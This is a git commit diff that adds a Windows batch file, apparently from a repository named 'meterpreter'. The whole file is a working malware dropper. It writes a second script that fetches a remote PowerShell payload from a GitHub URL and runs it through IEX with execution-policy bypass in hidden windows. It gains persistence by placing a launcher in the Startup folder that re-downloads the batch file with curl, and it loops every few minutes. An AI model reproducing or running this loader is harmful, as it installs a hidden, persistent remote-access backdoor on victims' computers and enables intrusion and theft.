856ab5089989954092ba47bb1f468c545f8c8ca6
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-08-16 02:19:06 +0300

    Create nihbtdtdow.bat

---
+++ nihbtdtdow.bat
@@ -0,0 +1,21 @@
+@echo off
+cd %temp%
+:loop
+    echo @echo off > rev.bat
+    echo :loop >> rev.bat
+    echo     if not exist "%temp%\sh1.ps1" ^( >> rev.bat
+    echo           echo IEX ^^(New-Object System.Net.WebClient^^).DownloadString^^('https://raw.githubusercontent.com/0x2034/meterpreter/main/meter.ps1'^^) ^>^> "%temp%\sh.ps1" >> rev.bat
+    echo     ^) >> rev.bat
+    echo     if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat" ^( >> rev.bat
+    echo           echo @echo off ^> "%temp%\start.bat" >> rev.bat
+    echo           echo curl https://raw.githubusercontent.com/0x2034/meterpreter/main/nihbtdtdow.bat -o "%temp%\nihbtdtdow.bat" ^>^> "%temp%\start.bat" >> rev.bat
+    echo           echo powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"%temp%\nihbtdtdow.bat\" -WindowStyle Hidden" ^>^> "%temp%\start.bat" >> rev.bat
+    echo           echo powershell -c "Start-Process -FilePath "%temp%\rev.bat" -WindowStyle Hidden" ^>^> "%temp%\start.bat" >> rev.bat
+    echo           move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" >> rev.bat      
+    echo     ^) >> rev.bat
+    echo     powershell -ep bypass -WindowStyle Hidden -File "%temp%\sh.ps1" >> rev.bat
+    echo timeout /t 300 /nobreak ^>nul >> rev.bat
+    echo goto loop >> rev.bat
+powershell -c "Start-Process -FilePath \"%temp%\rev.bat\" -WindowStyle Hidden"
+timeout /t 1200 /nobreak >nul
+goto loop
